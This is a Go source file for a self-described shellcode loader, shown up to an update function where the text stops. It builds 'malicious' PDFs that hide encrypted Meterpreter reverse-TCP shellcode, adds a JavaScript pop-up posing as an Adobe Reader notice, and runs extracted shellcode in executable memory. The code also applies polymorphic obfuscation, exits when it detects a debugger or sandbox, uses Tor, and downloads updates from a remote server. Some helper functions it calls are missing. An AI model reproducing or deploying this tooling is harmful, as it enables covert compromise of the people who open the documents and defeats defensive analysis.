package main

import (
	"bufio"
	"bytes"
	"unsafe"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"math"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/crypto/argon2"
	"golang.org/x/net/proxy"
)

// Configuration structure
type Config struct {
	UpdateURL      string `json:"update_url"`
	PDFMarker      string `json:"pdf_marker"`
	ShellcodeKey   string `json:"shellcode_key"`
	TorProxy       string `json:"tor_proxy"`
	AutoUpdate     bool   `json:"auto_update"`
	UseObfuscation bool   `json:"use_obfuscation"`
	AntiAnalysis   bool   `json:"anti_analysis"`
	MaxRetries     int    `json:"max_retries"`
}

// Shellcode payload structure
type Payload struct {
	Type      string `json:"type"`
	OS        string `json:"os"`
	Arch      string `json:"arch"`
	Encrypted string `json:"encrypted"`
	Checksum  string `json:"checksum"`
	Timestamp int64  `json:"timestamp"`
}

// Update information
type UpdateInfo struct {
	Version     string   `json:"version"`
	DownloadURL string   `json:"download_url"`
	Checksum    string   `json:"checksum"`
	Changelog   []string `json:"changelog"`
	Critical    bool     `json:"critical"`
	Date        string   `json:"date"`
}

// Constants
const (
	Version          = "1.3.7"
	ConfigFile       = "loader_config.json"
	CacheDir         = ".shellcode_cache"
	UpdateMarker     = "UPDATED_BY_SELF"
	B64Marker        = "B64_ENCRYPTED_SC:"
	HexMarker        = "HEX_ENCRYPTED_SC:"
	PolymorphicCount = 5
)

var (
	config     Config
	httpClient *http.Client
	mutex      sync.Mutex
)

// ==================== INITIALIZATION ====================

func init() {
	// Load configuration
	loadConfig()
	
	// Setup HTTP client with Tor support if configured
	setupHTTPClient()
	
	// Check for updates if enabled
	if config.AutoUpdate {
		go checkForUpdates()
	}
}

func loadConfig() {
	// Default configuration for Linux
	config = Config{
		UpdateURL:      "https://your-update-server.com/api/check",
		PDFMarker:      "%%SHELLCODE_PAYLOAD%%",
		ShellcodeKey:   "default-encryption-key-32bytes-long!!",
		TorProxy:       "socks5://127.0.0.1:9050",
		AutoUpdate:     true,
		UseObfuscation: true,
		AntiAnalysis:   true,
		MaxRetries:     3,
	}
	
	// Try to load from file
	if data, err := ioutil.ReadFile(ConfigFile); err == nil {
		json.Unmarshal(data, &config)
	}
	
	// Ensure key is 32 bytes
	if len(config.ShellcodeKey) < 32 {
		config.ShellcodeKey = padKey(config.ShellcodeKey)
	}
}

func setupHTTPClient() {
	if config.TorProxy != "" && strings.HasPrefix(config.TorProxy, "socks5://") {
		dialer, err := proxy.SOCKS5("tcp", strings.TrimPrefix(config.TorProxy, "socks5://"), nil, proxy.Direct)
		if err == nil {
			httpClient = &http.Client{
				Transport: &http.Transport{Dial: dialer.Dial},
				Timeout:   30 * time.Second,
			}
			return
		}
	}
	httpClient = &http.Client{Timeout: 30 * time.Second}
}

// ==================== MAIN FUNCTION ====================

func main() {
	if !antiAnalysisChecks() {
		fmt.Println("[!] Analysis environment detected, exiting...")
		os.Exit(0)
	}
	
	// Check command line arguments
	if len(os.Args) < 2 {
		printHelp()
		os.Exit(1)
	}
	
	command := os.Args[1]
	
	switch command {
	case "extract":
		if len(os.Args) < 3 {
			fmt.Println("Usage: loader extract <pdf_file>")
			os.Exit(1)
		}
		extractAndExecute(os.Args[2])
		
	case "create":
		if len(os.Args) < 4 {
			fmt.Println("Usage: loader create <shellcode_file> <output_pdf> [template_pdf]")
			os.Exit(1)
		}
		template := ""
		if len(os.Args) > 4 {
			template = os.Args[4]
		}
		createMaliciousPDF(os.Args[2], os.Args[3], template)
		
	case "obfuscate":
		if len(os.Args) < 4 {
			fmt.Println("Usage: loader obfuscate <input_file> <output_file>")
			os.Exit(1)
		}
		obfuscateShellcodeFile(os.Args[2], os.Args[3])
		
	case "deobfuscate":
		if len(os.Args) < 4 {
			fmt.Println("Usage: loader deobfuscate <input_file> <output_file>")
			os.Exit(1)
		}
		deobfuscateShellcodeFile(os.Args[2], os.Args[3])
		
	case "update":
		forceUpdate()
		
	case "scan":
		if len(os.Args) < 3 {
			fmt.Println("Usage: loader scan <pdf_file>")
			os.Exit(1)
		}
		scanPDF(os.Args[2])
		
	case "list":
		listPayloads()
		
	case "manage":
		interactivePayloadManagement()
		
	case "clean":
		cleanCache()
		
	case "version":
		fmt.Printf("Shellcode Loader v%s (Linux)\n", Version)
		
	case "interactive":
		runInteractiveMode()
		
	default:
		printHelp()
	}
}

// ==================== PDF PROCESSING ====================

func extractAndExecute(pdfPath string) {
	fmt.Printf("[+] Processing PDF: %s\n", pdfPath)
	
	// Read PDF
	data, err := ioutil.ReadFile(pdfPath)
	if err != nil {
		fmt.Printf("[-] Error reading PDF: %v\n", err)
		return
	}
	
	// Extract payload
	payload, err := extractPayload(data)
	if err != nil {
		fmt.Printf("[-] Error extracting payload: %v\n", err)
		return
	}
	
	fmt.Printf("[+] Payload extracted: %s/%s\n", payload.OS, payload.Arch)
	
	// Check if payload matches current system
	if !checkCompatibility(payload) {
		fmt.Println("[-] Payload not compatible with current system")
		return
	}
	
	// Decrypt shellcode
	shellcode, err := decryptShellcode(payload.Encrypted, config.ShellcodeKey)
	if err != nil {
		fmt.Printf("[-] Error decrypting shellcode: %v\n", err)
		return
	}
	
	// Verify checksum
	if !verifyChecksum(shellcode, payload.Checksum) {
		fmt.Println("[-] Checksum verification failed")
		return
	}
	
	fmt.Printf("[+] Shellcode decrypted: %d bytes\n", len(shellcode))
	
	// Cache the payload
	if err := cachePayload(payload, shellcode); err != nil {
		fmt.Printf("[-] Warning: Failed to cache payload: %v\n", err)
	}
	
	// Execute
	if err := executeShellcode(shellcode); err != nil {
		fmt.Printf("[-] Error executing shellcode: %v\n", err)
		return
	}
	
	fmt.Println("[+] Shellcode executed successfully")
}

func extractPayload(data []byte) (*Payload, error) {
	// Try multiple extraction methods
	methods := []func([]byte) (*Payload, error){
		extractFromJSON,
		extractFromBase64,
		extractFromHex,
	}
	
	for _, method := range methods {
		if payload, err := method(data); err == nil {
			return payload, nil
		}
	}
	
	return nil, errors.New("no payload found")
}

func extractFromJSON(data []byte) (*Payload, error) {
	// Look for JSON payload
	start := bytes.Index(data, []byte("{"))
	end := bytes.LastIndex(data, []byte("}"))
	
	if start == -1 || end == -1 || end < start {
		return nil, errors.New("no JSON found")
	}
	
	var payload Payload
	if err := json.Unmarshal(data[start:end+1], &payload); err != nil {
		return nil, err
	}
	
	return &payload, nil
}

func extractFromBase64(data []byte) (*Payload, error) {
	// Look for base64 marker
	if idx := bytes.Index(data, []byte(B64Marker)); idx != -1 {
		start := idx + len(B64Marker)
		end := bytes.Index(data[start:], []byte("\n"))
		if end == -1 {
			end = len(data) - start
		}
		
		b64Data := string(data[start : start+end])
		decoded, err := base64.StdEncoding.DecodeString(b64Data)
		if err != nil {
			return nil, err
		}
		
		var payload Payload
		if err := json.Unmarshal(decoded, &payload); err != nil {
			return nil, err
		}
		
		return &payload, nil
	}
	
	return nil, errors.New("no base64 marker found")
}

func extractFromHex(data []byte) (*Payload, error) {
	// Look for hex marker
	if idx := bytes.Index(data, []byte(HexMarker)); idx != -1 {
		start := idx + len(HexMarker)
		end := bytes.Index(data[start:], []byte("\n"))
		if end == -1 {
			end = len(data) - start
		}
		
		hexData := string(data[start : start+end])
		decoded, err := hex.DecodeString(hexData)
		if err != nil {
			return nil, err
		}
		
		var payload Payload
		if err := json.Unmarshal(decoded, &payload); err != nil {
			return nil, err
		}
		
		return &payload, nil
	}
	
	return nil, errors.New("no hex marker found")
}

// ==================== SHELLCODE EXECUTION (LINUX) ====================

// Check if we can execute shellcode on this system
func canExecuteShellcode() bool {
	// Check architecture
	if runtime.GOARCH != "amd64" && runtime.GOARCH != "arm64" {
		fmt.Printf("[-] Unsupported architecture: %s\n", runtime.GOARCH)
		return false
	}
	
	// Check for necessary system calls
	if runtime.GOOS != "linux" && runtime.GOOS != "darwin" {
		fmt.Printf("[-] Unsupported OS: %s\n", runtime.GOOS)
		return false
	}
	
	// Check memory protection
	if !checkMemoryProtection() {
		fmt.Println("[-] Memory protection checks failed")
		return false
	}
	
	return true
}

func checkMemoryProtection() bool {
	// Try a small allocation to test memory protection
	testSize := 4096
	mem, err := syscall.Mmap(
		-1,
		0,
		testSize,
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_ANON|syscall.MAP_PRIVATE,
	)
	
	if err != nil {
		return false
	}
	
	// Clean up
	syscall.Munmap(mem)
	return true
}

// Memory manipulation utilities
func allocateExecutableMemory(size int) ([]byte, error) {
	// Align to page size
	pageSize := syscall.Getpagesize()
	alignedSize := ((size + pageSize - 1) / pageSize) * pageSize
	
	mem, err := syscall.Mmap(
		-1,
		0,
		alignedSize,
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_ANON|syscall.MAP_PRIVATE,
	)
	
	if err != nil {
		return nil, err
	}
	
	return mem[:size], nil
}

func freeExecutableMemory(mem []byte) error {
	return syscall.Munmap(mem)
}

// Shellcode analysis
func analyzeShellcode(shellcode []byte) {
	fmt.Println("\n[+] Shellcode Analysis:")
	fmt.Printf("  Size:          %d bytes\n", len(shellcode))
	fmt.Printf("  Architecture:  ")
	
	// Detect architecture
	if isX86_64(shellcode) {
		fmt.Println("x86_64")
	} else if isARM64(shellcode) {
		fmt.Println("ARM64")
	} else if isX86(shellcode) {
		fmt.Println("x86")
	} else {
		fmt.Println("Unknown")
	}
	
	// Calculate entropy
	entropy := calculateEntropy(shellcode)
	fmt.Printf("  Entropy:       %.2f bits/byte\n", entropy)
	
	if entropy > 7.0 {
		fmt.Println("  [*] High entropy - possibly encrypted/compressed")
	}
	
	// Check for null bytes
	nullCount := 0
	for _, b := range shellcode {
		if b == 0 {
			nullCount++
		}
	}
	fmt.Printf("  Null bytes:    %d (%.1f%%)\n", nullCount, float64(nullCount)/float64(len(shellcode))*100)
	
	// First few bytes
	fmt.Printf("  First 16 bytes: ")
	for i := 0; i < min(16, len(shellcode)); i++ {
		fmt.Printf("%02x ", shellcode[i])
	}
	fmt.Println()
}

func isX86_64(shellcode []byte) bool {
	if len(shellcode) < 2 {
		return false
	}
	
	// Common x86_64 prefixes
	prefixes := [][]byte{
		{0x48, 0x89}, {0x48, 0x8b}, {0x48, 0x83}, {0x48, 0xc7},
		{0x48, 0x31}, {0x48, 0xff}, {0x48, 0x8d},
	}
	
	for _, prefix := range prefixes {
		if bytes.HasPrefix(shellcode, prefix) {
			return true
		}
	}
	
	return false
}

func isARM64(shellcode []byte) bool {
	if len(shellcode) < 4 {
		return false
	}
	
	// ARM64 instructions are 4 bytes aligned
	// Look for common ARM64 opcodes
	return false // Simplified - would need proper ARM64 detection
}

func isX86(shellcode []byte) bool {
	if len(shellcode) < 2 {
		return false
	}
	
	// Common x86 prefixes (32-bit)
	prefixes := [][]byte{
		{0x31, 0xc0}, {0x31, 0xdb}, {0x31, 0xc9}, {0x31, 0xd2},
		{0x6a, 0x00}, {0x68}, {0xb8},
	}
	
	for _, prefix := range prefixes {
		if bytes.HasPrefix(shellcode, prefix) {
			return true
		}
	}
	
	return false
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ==================== SHELLCODE EXECUTION (LINUX) ====================




// Main shellcode execution using syscalls
func executeShellcodeSyscall(shellcode []byte) error {
	// Get page size for alignment
	pageSize := syscall.Getpagesize()
	if pageSize <= 0 {
		pageSize = 4096 // Default page size
	}
	
	// Calculate aligned size
	shellcodeSize := len(shellcode)
	alignedSize := ((shellcodeSize + pageSize - 1) / pageSize) * pageSize
	
	fmt.Printf("[+] Shellcode size: %d bytes, Aligned: %d bytes\n", shellcodeSize, alignedSize)
	
	// Allocate memory with mmap (PROT_READ|PROT_WRITE initially)
	addr, _, err := syscall.Syscall6(
		syscall.SYS_MMAP,
		0, // address (0 = let OS choose)
		uintptr(alignedSize),
		syscall.PROT_READ|syscall.PROT_WRITE,
		syscall.MAP_ANON|syscall.MAP_PRIVATE,
		^uintptr(0), // fd (-1 for anonymous mapping)
		0,           // offset
	)
	
	if err != 0 {
		return fmt.Errorf("mmap failed: %v", err)
	}
	
	fmt.Printf("[+] Memory allocated at: 0x%x\n", addr)
	
	// Copy shellcode to allocated memory
	dest := (*[1 << 30]byte)(unsafe.Pointer(addr))[:shellcodeSize]
	copy(dest, shellcode)
	
	// Make memory executable using mprotect
	_, _, err = syscall.Syscall(
		syscall.SYS_MPROTECT,
		addr,
		uintptr(alignedSize),
		syscall.PROT_READ|syscall.PROT_EXEC,
	)
	
	if err != 0 {
		// Clean up on error
		syscall.Syscall(syscall.SYS_MUNMAP, addr, uintptr(alignedSize), 0)
		return fmt.Errorf("mprotect failed: %v", err)
	}
	
	fmt.Printf("[+] Memory made executable\n")
	
	// Execute shellcode in a separate goroutine
	go func() {
		defer func() {
			// Clean up memory when done (optional)
			syscall.Syscall(syscall.SYS_MUNMAP, addr, uintptr(alignedSize), 0)
			fmt.Println("[+] Shellcode execution completed, memory freed")
		}()
		
		// Execute the shellcode
		executeAtAddress(addr)
	}()
	
	fmt.Printf("[+] Shellcode execution started in background\n")
	return nil
}

// Execute code at a memory address
func executeAtAddress(addr uintptr) {
	// Convert address to function pointer
	type shellcodeFunc func()
	
	// Create a function pointer
	fptr := *(*shellcodeFunc)(unsafe.Pointer(&addr))
	
	// Add recovery to catch any panics from shellcode
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("[!] Shellcode panic recovered: %v\n", r)
		}
	}()
	
	// Execute
	fmt.Printf("[+] Executing shellcode at 0x%x...\n", addr)
	fptr()
}

// Alternative implementation using closure
func executeShellcodeClosure(shellcode []byte) error {
	// Allocate executable memory
	mem, err := syscall.Mmap(
		-1,
		0,
		len(shellcode),
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_ANON|syscall.MAP_PRIVATE,
	)
	if err != nil {
		return err
	}
	
	// Copy shellcode
	copy(mem, shellcode)
	
	// Create closure that executes the shellcode
	shellcodeClosure := func() {
		// Cast memory to function and execute
		funcPtr := unsafe.Pointer(&mem[0])
		asmFunc := *(*func())(unsafe.Pointer(&funcPtr))
		asmFunc()
		
		// Optional: cleanup
		syscall.Munmap(mem)
	}
	
	// Execute in goroutine
	go shellcodeClosure()
	
	return nil
}

// macOS compatible execution
func executeDarwin(shellcode []byte) error {
	// Similar to Linux but with MAP_ANON instead of MAP_ANONYMOUS
	pageSize := syscall.Getpagesize()
	if pageSize <= 0 {
		pageSize = 4096
	}
	
	shellcodeSize := len(shellcode)
	alignedSize := ((shellcodeSize + pageSize - 1) / pageSize) * pageSize
	
	// macOS uses slightly different flags
	addr, _, err := syscall.Syscall6(
		syscall.SYS_MMAP,
		0,
		uintptr(alignedSize),
		syscall.PROT_READ|syscall.PROT_WRITE,
		syscall.MAP_ANON|syscall.MAP_PRIVATE,
		^uintptr(0),
		0,
	)
	
	if err != 0 {
		return fmt.Errorf("mmap failed on macOS: %v", err)
	}
	
	// Copy shellcode
	dest := (*[1 << 30]byte)(unsafe.Pointer(addr))[:shellcodeSize]
	copy(dest, shellcode)
	
	// Make executable
	_, _, err = syscall.Syscall(
		syscall.SYS_MPROTECT,
		addr,
		uintptr(alignedSize),
		syscall.PROT_READ|syscall.PROT_EXEC,
	)
	
	if err != 0 {
		syscall.Syscall(syscall.SYS_MUNMAP, addr, uintptr(alignedSize), 0)
		return fmt.Errorf("mprotect failed on macOS: %v", err)
	}
	
	// Execute in goroutine
	go func() {
		// Create function from address
		type darwinFunc func()
		fptr := *(*darwinFunc)(unsafe.Pointer(&addr))
		
		// Execute with panic recovery
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("[!] macOS shellcode panic: %v\n", r)
			}
			syscall.Syscall(syscall.SYS_MUNMAP, addr, uintptr(alignedSize), 0)
		}()
		
		fptr()
	}()
	
	return nil
}

//  version with error handling and logging
func executeShellcode(shellcode []byte) error {
	// Validate shellcode
	if len(shellcode) == 0 {
		return errors.New("empty shellcode")
	}
	
	if len(shellcode) > 10*1024*1024 { // 10MB limit
		return errors.New("shellcode too large")
	}
	
	fmt.Printf("[+] Executing %d bytes of shellcode\n", len(shellcode))
	
	// Anti-analysis check before execution
	if config.AntiAnalysis {
		if !checkDebugger() {
			return errors.New("debugger detected")
		}
		if !checkSandbox() {
			return errors.New("sandbox detected")
		}
	}
	
	// Obfuscate if enabled
	var processedShellcode []byte
	if config.UseObfuscation {
		processedShellcode = polymorphicDecode(shellcode)
		fmt.Printf("[+] Shellcode deobfuscated: %d -> %d bytes\n", 
			len(shellcode), len(processedShellcode))
	} else {
		processedShellcode = shellcode
	}
	
	// Choose execution method based on platform
	switch runtime.GOOS {
	case "linux":
		return executeLinux(processedShellcode)
	case "darwin":
		return executeDarwin(processedShellcode)
	default:
		return fmt.Errorf("platform %s not supported", runtime.GOOS)
	}
}

func executeLinux(shellcode []byte) error {
	// Use multiple retries
	maxRetries := config.MaxRetries
	if maxRetries <= 0 {
		maxRetries = 3
	}
	
	var lastErr error
	
	for i := 0; i < maxRetries; i++ {
		if i > 0 {
			fmt.Printf("[+] Retry %d/%d\n", i, maxRetries)
			time.Sleep(time.Duration(i*100) * time.Millisecond) // Exponential backoff
		}
		
		err := executeShellcodeSyscallWithRecovery(shellcode)
		if err == nil {
			return nil
		}
		
		lastErr = err
		fmt.Printf("[-] Attempt %d failed: %v\n", i+1, err)
	}
	
	return fmt.Errorf("all %d attempts failed: %v", maxRetries, lastErr)
}

func executeShellcodeSyscallWithRecovery(shellcode []byte) error {
	// Allocate memory
	mem, err := syscall.Mmap(
		0,
		0,
		len(shellcode),
		syscall.PROT_READ|syscall.PROT_WRITE,
		syscall.MAP_ANON|syscall.MAP_PRIVATE,
	)
	if err != nil {
		return fmt.Errorf("mmap failed: %v", err)
	}
	
	// Ensure cleanup
	cleanup := func() {
		syscall.Munmap(mem)
	}
	
	// Copy shellcode
	copy(mem, shellcode)
	
	// Change protection to executable
	if err := syscall.Mprotect(mem, syscall.PROT_READ|syscall.PROT_EXEC); err != nil {
		cleanup()
		return fmt.Errorf("mprotect failed: %v", err)
	}
	
	// Create execution function with panic recovery
	execute := func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("[!] Shellcode panic: %v\n", r)
			}
			cleanup()
		}()
		
		// Create function pointer
		funcPtr := unsafe.Pointer(&mem[0])
		shellcodeFunc := *(*func())(unsafe.Pointer(&funcPtr))
		
		// Execute
		shellcodeFunc()
	}
	
	// Execute in separate goroutine
	go execute()
	
	// Give it a moment to start
	time.Sleep(50 * time.Millisecond)
	
	return nil
}



// Test function for shellcode execution
func testShellcodeExecution() error {
	
	
	fmt.Println("[+] Testing shellcode execution...")
	
	// This shellcode will exit the process, so run it in a separate process
	// For testing, we'll use a less destructive shellcode
	// Example: write(1, "Hello", 5) and exit(0)
	safeTestShellcode := []byte{
		// write(1, "Hello\n", 6)
		0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, // mov rax,1 (write)
		0x48, 0xC7, 0xC7, 0x01, 0x00, 0x00, 0x00, // mov rdi,1 (stdout)
		0x48, 0x8D, 0x35, 0x0A, 0x00, 0x00, 0x00, // lea rsi,[rip+0xa] (string address)
		0x48, 0xC7, 0xC2, 0x06, 0x00, 0x00, 0x00, // mov rdx,6 (length)
		0x0F, 0x05,                               // syscall
		// exit(0)
		0x48, 0xC7, 0xC0, 0x3C, 0x00, 0x00, 0x00, // mov rax,60 (exit)
		0x48, 0x31, 0xFF,                         // xor rdi,rdi (exit code 0)
		0x0F, 0x05,                               // syscall
		// String data: "Hello\n"
		0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x0A,
	}
	
	return executeShellcodeSyscall(safeTestShellcode)
}



// ==================== ENCRYPTION & OBFUSCATION ====================

func encryptShellcode(shellcode []byte, key string) (string, error) {
	// Derive key using Argon2
	salt := make([]byte, 16)
	if _, err := rand.Read(salt); err != nil {
		return "", err
	}
	
	derivedKey := argon2.IDKey([]byte(key), salt, 1, 64*1024, 4, 32)
	
	// Create AES cipher
	block, err := aes.NewCipher(derivedKey)
	if err != nil {
		return "", err
	}
	
	// GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	
	// Generate nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	
	// Encrypt
	ciphertext := gcm.Seal(nonce, nonce, shellcode, nil)
	
	// Combine salt + ciphertext
	combined := append(salt, ciphertext...)
	
	// Return as base64
	return base64.StdEncoding.EncodeToString(combined), nil
}

func decryptShellcode(encrypted string, key string) ([]byte, error) {
	// Decode base64
	data, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return nil, err
	}
	
	if len(data) < 16 {
		return nil, errors.New("invalid encrypted data")
	}
	
	// Extract salt and ciphertext
	salt := data[:16]
	ciphertext := data[16:]
	
	// Derive key
	derivedKey := argon2.IDKey([]byte(key), salt, 1, 64*1024, 4, 32)
	
	// Create cipher
	block, err := aes.NewCipher(derivedKey)
	if err != nil {
		return nil, err
	}
	
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	
	// Extract nonce
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("ciphertext too short")
	}
	
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	
	// Decrypt
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func obfuscateShellcodeFile(inputFile, outputFile string) {
	fmt.Printf("[+] Obfuscating shellcode: %s -> %s\n", inputFile, outputFile)
	
	shellcode, err := ioutil.ReadFile(inputFile)
	if err != nil {
		fmt.Printf("[-] Error reading file: %v\n", err)
		return
	}
	
	obfuscated := polymorphicEncode(shellcode)
	
	if err := ioutil.WriteFile(outputFile, obfuscated, 0644); err != nil {
		fmt.Printf("[-] Error writing file: %v\n", err)
		return
	}
	
	fmt.Printf("[+] Obfuscated %d bytes -> %d bytes\n", len(shellcode), len(obfuscated))
}

func deobfuscateShellcodeFile(inputFile, outputFile string) {
	fmt.Printf("[+] Deobfuscating shellcode: %s -> %s\n", inputFile, outputFile)
	
	obfuscated, err := ioutil.ReadFile(inputFile)
	if err != nil {
		fmt.Printf("[-] Error reading file: %v\n", err)
		return
	}
	
	deobfuscated := polymorphicDecode(obfuscated)
	
	if err := ioutil.WriteFile(outputFile, deobfuscated, 0644); err != nil {
		fmt.Printf("[-] Error writing file: %v\n", err)
		return
	}
	
	fmt.Printf("[+] Deobfuscated %d bytes -> %d bytes\n", len(obfuscated), len(deobfuscated))
}

func polymorphicEncode(shellcode []byte) []byte {
	// Multiple encoding layers
	encoded := make([]byte, len(shellcode))
	copy(encoded, shellcode)
	
	// XOR with random key
	key := byte(time.Now().UnixNano() % 256)
	for i := range encoded {
		encoded[i] ^= key
	}
	
	// Reverse
	for i, j := 0, len(encoded)-1; i < j; i, j = i+1, j-1 {
		encoded[i], encoded[j] = encoded[j], encoded[i]
	}
	
	// Add junk bytes
	junk := make([]byte, len(encoded)/4)
	rand.Read(junk)
	encoded = append(encoded, junk...)
	
	// Compress
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	gz.Write(encoded)
	gz.Close()
	
	return buf.Bytes()
}

func polymorphicDecode(data []byte) []byte {
	// Decompress if needed
	if len(data) > 2 && data[0] == 0x1f && data[1] == 0x8b {
		reader, err := gzip.NewReader(bytes.NewReader(data))
		if err == nil {
			defer reader.Close()
			if decompressed, err := ioutil.ReadAll(reader); err == nil {
				data = decompressed
			}
		}
	}
	
	// Remove junk bytes (assuming last 25% are junk)
	cleanLen := len(data) * 3 / 4
	if cleanLen < 1 {
		return data
	}
	cleanData := data[:cleanLen]
	
	// Reverse back
	for i, j := 0, len(cleanData)-1; i < j; i, j = i+1, j-1 {
		cleanData[i], cleanData[j] = cleanData[j], cleanData[i]
	}
	
	// XOR decode (try keys 0-255)
	for key := 0; key < 256; key++ {
		decoded := make([]byte, len(cleanData))
		for i := range cleanData {
			decoded[i] = cleanData[i] ^ byte(key)
		}
		
		// Check if result looks like shellcode
		if isValidShellcode(decoded) {
			return decoded
		}
	}
	
	return cleanData
}

// ==================== PDF CREATION ====================

func createMaliciousPDF(shellcodeFile, outputPDF, templatePDF string) {
	fmt.Printf("[+] Creating malicious PDF: %s\n", outputPDF)
	
	// Read shellcode
	shellcode, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		fmt.Printf("[-] Error reading shellcode: %v\n", err)
		return
	}
	
	// Create payload
	payload := Payload{
		Type:      "linux/x64/meterpreter/reverse_tcp",
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		Timestamp: time.Now().Unix(),
	}
	
	// Encrypt shellcode
	encrypted, err := encryptShellcode(shellcode, config.ShellcodeKey)
	if err != nil {
		fmt.Printf("[-] Error encrypting: %v\n", err)
		return
	}
	payload.Encrypted = encrypted
	
	// Calculate checksum
	payload.Checksum = calculateChecksum(shellcode)
	
	// Convert to JSON
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		fmt.Printf("[-] Error marshaling payload: %v\n", err)
		return
	}
	
	// Read template
	var pdfData []byte
	if templatePDF != "" {
		pdfData, err = ioutil.ReadFile(templatePDF)
		if err != nil {
			fmt.Printf("[-] Error reading template: %v\n", err)
			return
		}
	} else {
		// Use minimal PDF template
		pdfData = []byte(`%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj

4 0 obj
<<
/Length 25
>>
stream
BT /F1 12 Tf 72 720 Td (Document) Tj ET
endstream
endobj

%% PAYLOAD_PLACEHOLDER %%

xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000054 00000 n
0000000103 00000 n
0000000162 00000 n
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
281
%%EOF`)
	}
	
	// Embed payload
	marker := []byte("%% PAYLOAD_PLACEHOLDER %%")
	payloadComment := []byte(fmt.Sprintf("%s%s\n", B64Marker, base64.StdEncoding.EncodeToString(payloadJSON)))
	pdfData = bytes.Replace(pdfData, marker, payloadComment, 1)
	
	// Add JavaScript trigger (optional)
	if config.UseObfuscation {
		jsCode := `
		/OpenAction <<
		/S /JavaScript
		/JS (
		app.alert({
			cMsg: "This document requires a newer version of Adobe Reader.",
			cTitle: "Adobe Reader",
			nIcon: 3,
			nType: 0
		});
		)
		>>`
		pdfData = bytes.Replace(pdfData, []byte("/Pages 2 0 R"), []byte("/Pages 2 0 R\n"+jsCode), 1)
	}
	
	// Write output
	if err := ioutil.WriteFile(outputPDF, pdfData, 0644); err != nil {
		fmt.Printf("[-] Error writing PDF: %v\n", err)
		return
	}
	
	fmt.Printf("[+] PDF created successfully: %s (%d bytes)\n", outputPDF, len(pdfData))
	fmt.Printf("[+] Payload size: %d bytes (encrypted: %d chars)\n", len(shellcode), len(encrypted))
}

// ==================== UPDATE SYSTEM ====================

func checkForUpdates() {
	mutex.Lock()
	defer mutex.Unlock()
	
	fmt.Println("[+] Checking for updates...")
	
	// Check if already updated recently
	if _, err := os.Stat(UpdateMarker); err == nil {
		os.Remove(UpdateMarker)
		return
	}
	
	// Fetch update info
	updateInfo, err := fetchUpdateInfo()
	if err != nil {
		fmt.Printf("[-] Update check failed: %v\n", err)
		return
	}
	
	if updateInfo == nil || updateInfo.Version == Version {
		fmt.Println("[+] Already up to date")
		return
	}
	
	fmt.Printf("[!] Update available: %s -> %s\n", Version, updateInfo.Version)
	
	if updateInfo.Critical {
		fmt.Println("[!] CRITICAL UPDATE - Applying immediately...")
		applyUpdate(updateInfo)
	}
}

func fetchUpdateInfo() (*UpdateInfo, error) {
	req, err := http.NewRequest("GET", config.UpdateURL, nil)
	if err != nil {
		return nil, err
	}
	
	// Add headers to mimic browser
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("X-Version", Version)
	
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	
	var updateInfo UpdateInfo
	if err := json.NewDecoder(resp.Body).Decode(&updateInfo); err != nil {
		return nil, err
	}
	
	return &updateInfo, nil
}

func applyUpdate(updateInfo *UpdateInfo) {
	fmt.Printf("[+] Downloading update %s...\n", updateInfo.Version)
	
	// Download new version
	resp, err := httpClient.Get(updateInfo.DownloadURL)
	if err != nil {
		fmt.Printf("[-] Download failed: %v\n", err)
		return
	}
	defer resp.Body.Close()
	
	// Read update data
	updateData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[-] Read failed: %v\n", err)
		return
	}
	
	// Verify checksum
	if updateInfo.Checksum != "" {
		hash := sha256.Sum256(updateData)
		downloadChecksum := hex.EncodeToString(hash[:])
		if downloadChecksum != updateInfo.Checksum {
			fmt.Println("[-] Checksum mismatch!")
			return
		}
	}
	
	// Create update file
	updateFile := fmt.Sprintf("update_%s.bin", updateInfo.Version)
	if err := ioutil.WriteFile(updateFile, updateData, 0755); err != nil {
		fmt.Printf("[-] Write failed: %v\n", err)
		return
	}
	
	// Create updater script
	createUpdaterScript(updateFile)
	
	fmt.Println("[+] Update ready. Restarting...")
	
	// Mark for update
	ioutil.WriteFile(UpdateMarker, []byte(time.Now().String()), 0644)
	
